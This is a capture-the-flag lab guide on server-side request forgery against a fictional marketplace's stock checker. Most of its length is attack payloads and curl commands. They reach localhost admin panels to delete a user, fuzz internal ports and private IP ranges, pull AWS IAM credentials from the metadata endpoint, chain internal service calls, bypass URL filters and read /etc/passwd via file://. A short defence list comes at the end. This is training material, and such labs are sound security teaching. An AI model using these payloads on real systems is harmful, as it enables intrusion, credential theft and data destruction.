# Case Study: Lab 4 - Server-Side Request Forgery (SSRF)

## Business Context

**Company**: CloudStock Marketplace  
**Role**: Security Researcher  
**Date**: Q2 2024  
**Severity**: CRITICAL ⚠️

---

## Executive Summary

CloudStock Marketplace has deployed a new "Stock Availability Checker" feature that queries internal backend services to provide real-time inventory status. The feature integrates with a supposedly isolated internal API (`http://localhost:8080`), but security assessments have revealed critical vulnerabilities in how server-side requests are processed.

Your task is to **investigate and exploit SSRF vulnerabilities** to access restricted admin panels and internal services that should never be exposed to external requests.

---

## Business Problem

The development team implemented a stock checking feature without proper input validation on URLs. External users can potentially manipulate API requests to reach internal services, including:

- Admin control panels
- Internal management interfaces
- Metadata endpoints
- Protected configuration services

### Current Implementation Issues:
1. **No URL whitelist validation** - Server accepts any URL parameter
2. **No request origin verification** - External users can trigger internal requests
3. **No rate limiting on internal services** - Admin operations can be abused
4. **Insufficient logging** - Internal access patterns not properly monitored

---

## Challenge: Lab 4.1 - Internal Loopback Access

### Problem Statement

The Stock API has an endpoint `/api/check-stock` that accepts a `supplier_url` parameter. Testing indicates the server-side code makes HTTP requests to whatever URL is provided.

**Initial Reconnaissance:**
```
GET /api/check-stock?supplier_url=http://example.com/inventory
```

This would normally check an external supplier's inventory. However, what if you could make it check an *internal* URL instead?

---

## Variant 4.1 A: Unprotected Admin Panel on Localhost

### Problem Statement
Developers assumed the admin panel at `http://localhost/admin` is safe because it's on localhost. They never implement authentication or network isolation, trusting that external users can't reach it. However, SSRF in the stock API lets you make the SERVER request localhost URLs.

### Vulnerability Description
The server-side stock checker makes HTTP requests without validating the URL destination. No allowlist exists for safe domains. The admin panel is directly accessible from localhost with NO authentication.

```
POST /api/check-stock
{"supplier_url": "http://localhost/admin"}
```
Returns the full HTML of the admin panel, including user deletion links.

### Attack Steps
1. **Identify endpoint**: `/api/check-stock` or `/api/stock`
2. **Test parameter**: Try `supplier_url=http://example.com`
3. **Pivot to localhost**: Change to `http://localhost/admin`
4. **Observe response**: HTML of admin panel returned
5. **Extract admin URL**: Look for delete links in HTML
6. **Find carlos delete**: Pattern like `/admin/delete?user=carlos`
7. **Submit**: Post the delete URL

### Payload
```
supplier_url=http://localhost/admin
```

### Expected Response
```html
<h1>Admin Panel</h1>
<table>
  <tr><td>carlos</td><td><a href="/admin/delete?user=carlos">Delete</a></td></tr>
  ...
</table>
```

### Flag Endpoint
```
After successful SSRF deletion:
GET /admin/delete?user=carlos
Response: {"status": "deleted", "flag": "FLAG!lab4_1a_..."}
```

### Why It Works
- Server trusts localhost implicitly
- No URL validation on supplier parameter
- Direct file system access from response

### Tools
```
curl -X POST http://target/api/check-stock \
  -H "Content-Type: application/json" \
  -d '{"supplier_url":"http://localhost/admin"}'
```

---

## Variant 4.1 B: Hidden Internal Services on Non-Standard Ports

### Problem Statement  
The application has multiple internal services running on different ports (8080, 3000, 5000) that are supposed to be invisible. Developers thought port obscurity provides security. Each port runs a different internal service with different functionality and data. SSRF lets you discover and access all of them without knowing they exist.

### Vulnerability Description
No port range restrictions exist. You can enumerate various ports through SSRF and discover what's running internally. Services like internal APIs, dashboards, and configuration tools are exposed without any access control.

### Attack Steps
1. **Try localhost variations**:
   - `http://localhost/admin`
   - `http://127.0.0.1/admin`
   - `http://0.0.0.0/admin`
   
2. **Enumerate ports**:
   - `http://localhost:8080/`
   - `http://localhost:3000/`
   - `http://localhost:5000/`

3. **Analyze responses** - See which ports are active

4. **Find admin interface** on different port

5. **Exploit** with discovered service

### Payload Variations
```
supplier_url=http://127.0.0.1/admin
supplier_url=http://localhost:8080/
supplier_url=http://0.0.0.0/admin?debug=1
```

### Expected Findings
```json
{
  "localhost:80": "Main application",
  "localhost:8080": "Admin panel",
  "127.0.0.1:3000": "Internal API",
  "localhost:5000": "Configuration service"
}
```

### Why Different IPs/Ports
- Service might be on 127.0.0.1 only (not 0.0.0.0)
- Different ports for different services
- Port variation reveals more about infrastructure

### Tools
```bash
# Fuzz ports
for port in 80 3000 5000 8000 8080 8443 9000; do
  curl "http://target/api?url=http://localhost:$port/"
done
```

---

## Variant 4.1 C: Multi-Stage Admin Panel with Tiered Data Exposure

### Problem Statement
The admin panel has multiple sub-endpoints (`/admin/users`, `/admin/config`, `/admin/logs`, `/admin/database`) that each expose progressively more sensitive information. Developers built no access control between these paths, assuming they're all "admin-only" and therefore safe. SSRF bypasses this assumption completely, exposing the entire admin structure including configuration and system logs.

### Vulnerability Description
Each admin path leaks different sensitive data. `/admin/config` contains API keys, `/admin/logs` reveals system behavior, `/admin/database` shows query patterns. Following the path chain through SSRF reveals the full infrastructure.

### Attack Steps
1. **Find admin panel** (as in 4.1A)
2. **Enumerate paths**:
   - `/admin/delete`
   - `/admin/users`
   - `/admin/config`
   - `/admin/logs`
   - `/admin/database`

3. **Find data leakage** in different paths
4. **Extract sensitive info** before executing deletion
5. **Claim flag** from enhanced response

### Payload Variations
```
supplier_url=http://localhost/admin/users
supplier_url=http://localhost/admin/config
supplier_url=http://localhost/admin/logs
supplier_url=http://localhost/admin/delete?user=carlos&verbose=1
```

### Expected Path Responses
```
/admin                → Admin panel HTML
/admin/users          → List of all users with emails
/admin/delete?user=X  → Delete confirmation/results
/admin/logs           → System logs (may reveal more)
/admin/config         → Configuration with secrets
```

### Why It Works
- Path enumeration reveals more endpoints
- Server doesn't validate path depth
- Internal paths have more information
- No access control on SSRF endpoints

---

## Challenge: Lab 4.2 - Advanced SSRF Exploits (Metadata + Geoblock Bypass)

## Challenge: Lab 4.2 - Advanced SSRF Exploits (Metadata + Geoblock Bypass)

### Problem Statement

The organization deployed additional internal APIs for cloud metadata and geographic service checks:

- **Metadata Service**: `http://169.254.169.254/latest/` (AWS-style metadata)
- **Geo-blocking Service**: Internal IP range `10.0.0.0/8`
- **Cost Analysis API**: Internal analytics endpoint

These services were assumed to be unreachable from the public internet, but SSRF allows us to pivot.

---

## Variant 4.2 A: Cloud Infrastructure Credential Extraction

### Problem Statement
The server is deployed on AWS EC2. AWS automatically makes credentials available via the metadata service endpoint (`169.254.169.254`) that any process on the instance can access. Developers never considered that SSRF could reach this endpoint. The credentials in metadata allow full AWS account access.

### Vulnerability Description
The metadata endpoint exposes IAM role credentials including AccessKeyId, SecretAccessKey, and temporary tokens. These credentials have full permissions to the AWS account and all resources. SSRF combined with metadata access = complete cloud account compromise.

### Attack Steps
1. **Access metadata service**:
   ```
   supplier_url=http://169.254.169.254/latest/
   ```

2. **Get IAM role name**:
   ```
   supplier_url=http://169.254.169.254/latest/meta-data/iam/security-credentials/
   ```

3. **Extract credentials**:
   ```
   supplier_url=http://169.254.169.254/latest/meta-data/iam/security-credentials/[role-name]
   ```

4. **Analyze response** - Contains AWS access keys
5. **Use credentials** - Access AWS resources
6. **Claim flag** - Stored in response

### Expected Metadata Structure
```
/latest/meta-data/
├── ami-id
├── instance-id
├── instance-type
├── iam/
│   └── security-credentials/
│       └── [role-name]
│           ├── AccessKeyId
│           ├── SecretAccessKey
│           ├── Token
│           └── Expiration
└── user-data/
```

### Payload Variations
```
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://169.254.169.254/latest/user-data
http://169.254.169.254/latest/meta-data/instance-id
http://169.254.169.254/latest/meta-data/iam/info
```

### Expected Finding
```json
{
  "Code": "Success",
  "LastUpdated": "2024-04-09T12:00:00Z",
  "Type": "AWS-HMAC",
  "AccessKeyId": "AKIAIOSFODNN7EXAMPLE",
  "SecretAccessKey": "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY",
  "Token": "...",
  "Expiration": "2024-04-09T18:00:00Z"
}
```

### Why It Works
- Metadata endpoint is not restricted
- No origin validation on SSRF requests
- AWS credentials are in plain JSON
- Can be used to access AWS resources

---

## Variant 4.2 B: Private Network Segmentation Bypass

### Problem Statement
The infrastructure has internal services (database, cache, monitoring) on private IPs (10.0.0.0/8 range) that are blocked by firewall from external access. These services trust all traffic from internal network without authentication. SSRF lets you bypass the firewall entirely because requests originate from the internal server, not external internet.

### Vulnerability Description
Database, cache, and configuration services are isolated on private IP ranges. Firewalls block external access. BUT the web server making SSRF requests is internal, so responses come from a trusted source. No authentication required on internal services, they assume network isolation is enough.

### Attack Steps
1. **Target internal IP range**:
   - `10.0.0.0/8` (Private network)
   - `172.16.0.0/12` (Private)
   - `192.168.0.0/16` (Private)

2. **Enumerate internal hosts**:
   ```
   supplier_url=http://10.0.0.1/
   supplier_url=http://10.0.0.100/
   supplier_url=http://10.0.0.200/admin
   ```

3. **Identify active services** based on responses

4. **Access restricted services** that reject external access
   ```
   supplier_url=http://10.0.1.50:8080/internal-api
   ```

5. **Extract flag** from internal service

### Target Services Within IP Range
```
10.0.0.1        → Router/Gateway
10.0.0.50       → Database server
10.0.1.100      → Cache server (Redis/Memcached)
10.0.2.20       → Internal monitoring
10.0.3.80       → Internal API gateway
192.168.1.100   → Admin dashboard
```

### Payload Variations
```
http://10.0.0.50:3306/  (MySQL port try)
http://10.0.1.100:6379/ (Redis port)
http://10.0.2.20:9200/  (Elasticsearch)
http://192.168.1.1/admin (Router admin)
```

### Expected Findings
```
10.0.0.50:3306   → Database connection string/version
10.0.1.100:6379  → Redis info (keys, memory usage)
10.0.2.20:9200   → Elasticsearch indices, data
10.0.3.80        → Internal API documentation
```

### Why It Works
- Firewall allows server→internal traffic
- External access to private range is blocked
- SSRF bypasses source IP validation
- Internal services trust internal requests

---

## Variant 4.2 C: Service Registry Enumeration and Escalation

### Problem Statement
The infrastructure uses a service registry (API gateway at localhost:8080) that returns a list of all internal services. This registry is supposed to be admin-only but has no authentication. Once you discover the service list via SSRF, you can chain requests to each service. Some services (auth-service) have elevated privileges that let you get tokens for other services (admin-service). One SSRF entry point becomes unlimited internal access.

### Vulnerability Description
SSRF to registry → see all services → SSRF to auth-service → get admin token → SSRF to admin-service with token → extract secrets. The vulnerability multiplies through chaining because service-to-service communication is fully trusted.

### Attack Steps
1. **Find API gateway** (usually at internal address):
   ```
   supplier_url=http://localhost:8080/services
   ```

2. **Get service list** from gateway response:
   ```
   Response shows: auth-service, payment-service, user-service, admin-service
   ```

3. **Access discovered services**:
   ```
   supplier_url=http://localhost:8080/auth-service/admin
   supplier_url=http://localhost:8080/user-service/all-users
   supplier_url=http://localhost:8080/admin-service/config
   ```

4. **Exploit specific service** with admin access
5. **Extract sensitive data** from chained requests
6. **Claim flag** with escalated access

### Service Discovery Patterns
```
/services/list
/api/v1/services
/actuator/health (Spring Boot)
/healthz (Kubernetes)
/.well-known/services
/admin/status
/internal/status
```

### Payload Variations - Accessing Different Services
```
supplier_url=http://localhost:8080/api/auth-service/admin
supplier_url=http://localhost:8080/api/payment-service/transactions?limit=1000
supplier_url=http://localhost:8080/api/user-service/export?format=csv
supplier_url=http://localhost:8080/api/admin-service/backup/download
```

### Expected Chained Exploitation
```
SSRF Request 1 → Discover services
SSRF Request 2 → Access auth-service → Get admin token
SSRF Request 3 → Use token with admin-service → Access secrets
SSRF Request 4 → Download configuration → Find credentials
```

### Why It's Powerful
- One vulnerability leads to multiple services
- Service discovery reveals architecture
- Token/auth reuse across services
- Admin access in one = access to all
- Chained requests multiply impact

---

## Common SSRF Bypass Techniques Used in Lab 4.2

### If Direct Localhost Blocked
```
http://127.0.0.1:80     → bypass "localhost" filter
http://0.0.0.0:80       → alternate representation
http://localhost:80     → case variation
http://LOCALHOST        → uppercase
http://127.1            → shortened notation
http://2130706433       → decimal notation (127.0.0.1)
```

### If Certain Ports Blocked
```
supplier_url=http://localhost:8080
supplier_url=http://localhost:3000
supplier_url=http://localhost:5000
[Try non-standard ports for internal services]
```

### If URL Starts with Validation
```
Filter: Rejects URLs starting with "http://"
Bypass: Use "HTTP://" (case variation)

Filter: Rejects "localhost"
Bypass: Use "127.0.0.1"

Filter: Requires domain
Bypass: Use domain redirect that points to localhost
```

---

## Lab 4 Complete Variant Map

```
Lab 4.1 (Loopback Admin Access)
├─ Variant A: Basic localhost admin panel access
├─ Variant B: Port/IP enumeration (find alternate services)
└─ Variant C: Path traversal within admin endpoints

Lab 4.2 (Advanced + Metadata)
├─ Variant A: AWS metadata extraction (credentials)
├─ Variant B: Private IP range access (geoblock bypass) 
└─ Variant C: Service discovery + chained exploitation
```

---

## Complete Exploitation Workflow (All Variants)

### Phase 1: Reconnaissance (All Variants)
```
1. Identify parameter: supplier_url / url / endpoint
2. Test with external: http://example.com
3. Confirm SSRF: http://localhost vs error message
```

### Phase 2: Variant-Specific Exploitation

**Variants 4.1 A-C Path:**
```
4. Access localhost/admin
5. Extract HTML structure
6. Find admin operations
7. Execute specific operation
8. Retrieve flag
```

**Variants 4.2 A-C Path:**
```
4. Try metadata (169.254...)
5. Enumerate IP ranges (10.0.0.0...)
6. Find services (8080, 3000...)
7. Chain requests for escalation
8. Retrieve credentials/secrets
9. Retrieve flag
```

---

## Expected Discoveries Across All Variants

## Expected Discoveries Across All Variants

### Lab 4.1 A Expected Discoveries:
```json
{
  "vulnerability_type": "Direct SSRF - Localhost Access",
  "entry_point": "supplier_url parameter",
  "attack_flow": "External → SSRF endpoint → Localhost admin panel",
  "admin_panel_found": "http://localhost/admin",
  "delete_endpoint": "/admin/delete?user=carlos",
  "exploitation_method": "SSRF via supplier_url parameter",
  "result": "User carlos deleted successfully",
  "flag_format": "FLAG!lab4_1a_[hash]"
}
```

### Lab 4.1 B Expected Discoveries:
```json
{
  "vulnerability_type": "Port enumeration via SSRF",
  "services_discovered": {
    "localhost:80": "Main web application",
    "localhost:8080": "Admin panel (alternate port)",
    "localhost:3000": "API service (maybe)",
    "127.0.0.1:5000": "Configuration service"
  },
  "multiple_entry_points": true,
  "exploitation_method": "SSRF with port fuzzing",
  "result": "Access to hidden services on different ports",
  "flag_format": "FLAG!lab4_1b_[hash]"
}
```

### Lab 4.1 C Expected Discoveries:
```json
{
  "vulnerability_type": "Path traversal + SSRF combination",
  "admin_paths_found": [
    "/admin/users",
    "/admin/delete",
    "/admin/config",
    "/admin/logs",
    "/admin/database"
  ],
  "data_exposed": "Configuration, logs, user list, database info",
  "escalation": "From basic delete to config/secrets exposure",
  "exploitation_method": "SSRF + path enumeration",
  "flag_format": "FLAG!lab4_1c_[hash]"
}
```

### Lab 4.2 A Expected Discoveries:
```json
{
  "vulnerability_type": "AWS metadata extraction via SSRF",
  "metadata_endpoint": "http://169.254.169.254/latest/",
  "credential_extracted": true,
  "extracted_credentials": {
    "AccessKeyId": "AKIA...",
    "SecretAccessKey": "...",
    "Token": "...",
    "Expiration": "..."
  },
  "impact": "Full AWS account access with extracted credentials",
  "exploitation_method": "SSRF to metadata endpoint",
  "flag_format": "FLAG!lab4_2a_[hash]"
}
```

### Lab 4.2 B Expected Discoveries:
```json
{
  "vulnerability_type": "Private IP range access via SSRF",
  "geoblock_bypass": true,
  "internal_ips_accessed": [
    "10.0.0.50",
    "10.0.1.100", 
    "192.168.1.1"
  ],
  "services_found": [
    "Database (10.0.0.50:3306)",
    "Cache (10.0.1.100:6379)",
    "Admin dashboard (192.168.1.1)"
  ],
  "data_leaked": "Service banners, configurations, connection details",
  "exploitation_method": "SSRF to private IP range",
  "flag_format": "FLAG!lab4_2b_[hash]"
}
```

### Lab 4.2 C Expected Discoveries:
```json
{
  "vulnerability_type": "Chained SSRF + service discovery",
  "service_discovery": true,
  "services_enumerated": [
    "auth-service",
    "payment-service",
    "user-service",
    "admin-service"
  ],
  "attack_chain": [
    "SSRF to service registry",
    "Discover all internal services",
    "SSRF to each service",
    "Elevate privileges via auth-service",
    "Access admin-service with elevated token",
    "Download config/secrets"
  ],
  "escalation_achieved": true,
  "exploitation_method": "Multi-step SSRF with chaining",
  "flag_format": "FLAG!lab4_2c_[hash]"
}
```

---

## Step-by-Step General Exploitation Guide
```
Test with a known internal address:
POST /api/check-stock HTTP/1.1
Content-Type: application/json

{"supplier_url": "http://localhost/admin"}
```

### Step 2: Analyze the Response
- Look for HTML content from internal pages
- Check response headers for location/redirect info
- Note any error messages revealing internal structure

### Step 3: Enumerate Internal Services
```
Try these common internal endpoints:
- http://localhost:80
- http://localhost:8080
- http://localhost:3000
- http://127.0.0.1/admin
- http://169.254.169.254/ (metalink)
```

### Step 4: Extract Admin Links
Once you reach `/admin`:
- View page source (in response body)
- Find `<a>` tags with href attributes
- Look for pattern like `/admin/delete?user=carlos`

### Step 5: Exploit the Vulnerability
```
Submit the admin delete URL:
POST /api/check-stock HTTP/1.1
{"supplier_url": "http://localhost/admin/delete?user=carlos"}
```

### Step 6: Claim Flag
The response should contain a flag string. Extract and submit it.

---

## What You Should Discover

### Lab 4.1 Expected Discoveries:
```json
{
  "admin_panel_found": "http://localhost/admin",
  "delete_endpoint": "/admin/delete?user=carlos",
  "exploitation_method": "SSRF via supplier_url parameter",
  "result": "User carlos deleted successfully",
  "flag_format": "FLAG!lab4_1_[hash]"
}
```

### Lab 4.2 Expected Discoveries:
```json
{
  "metadata_service": "http://localhost:8080/metadata",
  "bypass_technique": "URL encoding or scheme variations",
  "chained_vulnerabilities": ["SSRF", "Admin Panel Exposure"],
  "sensitive_data": "Configuration, API keys, internal IPs",
  "flag_format": "FLAG!lab4_2_[hash]"
}
```

---

## Technical Concepts Tested

### Server-Side Request Forgery (SSRF)
```
Attacker → Web Server → Attacker's Payload
            (makes request to)
            Internal Network
```

**Why it works:**
- Server trusts its own network (localhost/internal IPs)
- No validation on redirect destinations
- URL parameters passed directly to HTTP library

### Common SSRF Bypasses:
1. **Localhost variations**: `localhost`, `127.0.0.1`, `0.0.0.0`, `::1`
2. **URL encoding**: `127%2e0%2e0%2e1`, `http%3A%2F%2F`
3. **IP math**: `2130706433` (decimal for `127.0.0.1`)
4. **Domain redirects**: `attacker.com` redirects to `localhost`

### Defense (What You Should Learn)
- ✅ Whitelist allowed URLs/domains
- ✅ Validate and sanitize all URL parameters
- ✅ Implement network segmentation
- ✅ Disable HTTP redirects following
- ✅ Use private IP blocklists
- ✅ Implement rate limiting on internal APIs
- ✅ Log all server-side request activity

---

## Tools Recommended

### Intercept & Tamper
- Burp Suite (Intruder tab for fuzzing)
- OWASP ZAP
- Fiddler

### Testing
```bash
# Manual curl testing
curl "http://target/api/check-stock?supplier_url=http://localhost/admin"

# Test different schemes
curl "http://target/api?url=http://127.0.0.1:8080"
curl "http://target/api?url=file:///etc/passwd"
```

### URL Encoding Tools
- Burp Suite Decoder
- Command line: `python3 -c "import urllib.parse; print(urllib.parse.quote('http://localhost'))"`

---

## Flag Submission Checklist

- [ ] Identified the vulnerable parameter (`supplier_url`)
- [ ] Successfully accessed `http://localhost/admin` via SSRF
- [ ] Found the admin delete endpoint structure
- [ ] Extracted user "carlos" delete operation
- [ ] Received flag in response
- [ ] Submitted flag to platform

---

## Real-World Impact

**If this vulnerability were not caught:**
- Attackers could delete arbitrary user accounts
- Admin operations could be performed without authentication
- Internal API credentials could be exposed
- Full compromise of admin functions
- Potential data breach through metadata access

---

## Key Takeaways

1. **Never trust server-side requests** to internal networks without validation
2. **URL parameters are attacks surfaces** - treat them with suspicion
3. **Internal services need protection** - don't assume they're safe behind NAT
4. **SSRF is a gateway vulnerability** - it enables further exploitation
5. **Network segmentation is critical** - isolate sensitive services

---

## Related Security Concepts

- **CWE-918**: Server-Side Request Forgery (SSRF)
- **OWASP**: A04:2021 Insecure Design (related to API design)
- **CVE patterns**: Many cloud infrastructure breaches start with SSRF

---

**Good luck! Document your findings for the security team review.**
